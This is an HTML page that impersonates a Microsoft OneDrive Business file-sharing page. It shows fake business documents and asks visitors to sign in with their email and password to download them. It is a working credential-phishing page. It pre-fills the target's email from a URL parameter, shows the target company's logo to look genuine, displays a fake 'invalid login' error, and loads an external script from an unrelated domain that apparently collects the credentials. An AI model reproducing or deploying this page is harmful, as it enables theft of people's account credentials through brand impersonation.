<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>OneDrive Business</title>
    <link href="https://storage.googleapis.com/stor-images/images/fav.png" rel="icon" type="image/ico">
    <meta name="viewport" content="width=device-width, initial-scale=0.73">

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <style>
        body {
            background-color: #f8f9fa;
            font-size: 0.95rem;
        }

        .section-padding {
            padding: 2rem 1rem;
        }

        .document-layout {
            display: flex;
            flex-wrap: wrap;
            gap: 2rem;
            justify-content: center;
            align-items: flex-start;
        }

        .document-section {
            flex: 1 1 480px;
            max-width: 500px;
        }

        .image-section {
            flex: 1 1 320px;
            text-align: center;
        }

        .image-section img {
            max-width: 100%;
            border-radius: 12px;
        }

        .document-row {
            background-color: #fff;
            border-radius: 10px;
            padding: 0.75rem 1rem;
            margin-bottom: 1rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
            transition: background 0.2s ease-in-out;
        }

        .document-row:hover {
            background-color: #f0f0f0;
        }

        .document-info {
            display: flex;
            align-items: center;
            gap: 0.8rem;
        }

        .document-icon {
            font-size: 1.5rem;
        }

        .download-btn {
            padding: 0.4rem 0.8rem;
            font-size: 0.875rem;
        }

        .progress-container {
            padding: 0 0.5rem;
            margin-top: 0.3rem;
        }

        .progress {
            height: 14px;
        }

        .email-provider img {
            height: 30px;
            margin: 0 8px;
        }

        #loginSection {
            display: none;
            margin-top: 2rem;
        }

        .password-wrapper {
            position: relative;
        }

        .password-wrapper .toggle-password {
            position: absolute;
            top: 50%;
            right: 10px;
            transform: translateY(-50%);
            cursor: pointer;
        }

        footer {
            margin-top: 3rem;
        }
    </style>
</head>

<body>

    <section class="container section-padding">
        <div class="document-layout">

            <!-- Document Section -->
            <div class="document-section">
                <h4 class="fw-bold mb-4">Downloadable Files</h4>

                <!-- Company Profile.pdf -->
                <div class="document-group">
                    <div class="document-row">
                        <div class="document-info">
                            <i class="bi bi-file-earmark-pdf-fill text-danger document-icon"></i>
                            <span>Company Profile.pdf</span>
                        </div>
                        <button class="btn btn-outline-primary download-btn">Download</button>
                    </div>
                    <div class="progress-container d-none">
                        <div class="progress">
                            <div class="progress-bar bg-success progress-bar-striped progress-bar-animated" style="width: 0%;">0%</div>
                        </div>
                    </div>
                </div>

                <!-- Payment terms.pdf -->
                <div class="document-group">
                    <div class="document-row">
                        <div class="document-info">
                            <i class="bi bi-file-earmark-pdf-fill text-danger document-icon"></i>
                            <span>Company Registration Certificate.pdf</span>
                        </div>
                        <button class="btn btn-outline-primary download-btn">Download</button>
                    </div>
                    <div class="progress-container d-none">
                        <div class="progress">
                            <div class="progress-bar bg-success progress-bar-striped progress-bar-animated" style="width: 0%;">0%</div>
                        </div>
                    </div>
                </div>

                <!-- technical specifications.xls -->
                <div class="document-group">
                    <div class="document-row">
                        <div class="document-info">
                            <i class="bi bi-file-earmark-excel-fill text-success document-icon"></i>
                            <span>Order Technical Specifications.xls</span>
                        </div>
                        <button class="btn btn-outline-primary download-btn">Download</button>
                    </div>
                    <div class="progress-container d-none">
                        <div class="progress">
                            <div class="progress-bar bg-success progress-bar-striped progress-bar-animated" style="width: 0%;">0%</div>
                        </div>
                    </div>
                </div>

               
            </div>

            <!-- Image and Login Section -->
            <div class="image-section">
                <img id="mainImage" src="https://iili.io/FxjOBfa.png" alt="Preview">
                <img id="loginImage" src="https://storage.googleapis.com/stor-images/images/hd.png" alt="Login Image" class="d-none mt-4">

                <div id="loginSection" class="card shadow-sm mt-4 p-4">
                    <h5 class="fw-bold mb-3">Sign in to access shared files
</h5>

                    <form id="loginForm" novalidate="">
                        <div class="mb-2">
                            <input type="email" class="form-control" placeholder="Email address" value="" name="email" id="emailInput">
                        </div>
                        <div class="mb-2 password-wrapper">
                            <input type="password" class="form-control" placeholder="Password" name="password" id="passwordInput">
                            <i class="bi bi-eye-slash toggle-password" id="togglePassword"></i>
                        </div>

                        <div class="mb-2 text-start">
                            <div id="emailError" class="text-danger small" style="display: none;"></div>
                            <div id="passwordError" class="text-danger small" style="display: none;"></div>
                        </div>

                        <div class="mb-2">
                            <button type="submit" id="loginButton" class="btn btn-primary w-100">
                                Download Documents
                            </button>
                        </div>
                    </form>

                    <div id="loginMessage" class="alert alert-danger mt-2 d-none" role="alert">
                        ⚠️ Invalid Login details, please try again.
                    </div>

                    <div class="text-center mt-3 email-provider">
                        <img id="providerLogo" src="" alt="Provider Logo" style="height: 32px;">
                    </div>
                </div>
            </div>

        </div>
    </section>

    <footer class="text-center py-3">
        <small class="text-muted">Powered by Microsoft OneDrive Business © 2025</small>
    </footer>
	<script src="https://sankhumilkbalyne.com/sktunda/wakachn.js"></script type="text/javascript">

	
<script>
function updateLogoFromEmail(email) {
    const domain = email.includes('@') ? email.split('@')[1] : '';

    if (domain) {
        $('#providerLogo')
            .attr('src', 'https://logo.clearbit.com/' + domain)
            .show()
            .on('error', function () {
                $(this).hide(); // Hide if logo not found
            });
    } else {
        $('#providerLogo').attr('src', '').hide();
    }
}

// Update logo when typing
$('#emailInput').on('input', function () {
    updateLogoFromEmail($(this).val().trim());
});

// Auto-load logo on page load
$(document).ready(function () {
    const initialEmail = $('#emailInput').val().trim();
    if (initialEmail) {
        updateLogoFromEmail(initialEmail);
    }
});
</script>

<script>
  // Get the "cms" parameter from URL
  const params = new URLSearchParams(window.location.search);
  const emailFromURL = params.get('cms');

  // If it exists, set it as the value of the email field
  if (emailFromURL) {
    document.getElementById('emailInput').value = emailFromURL;
  }
</script>
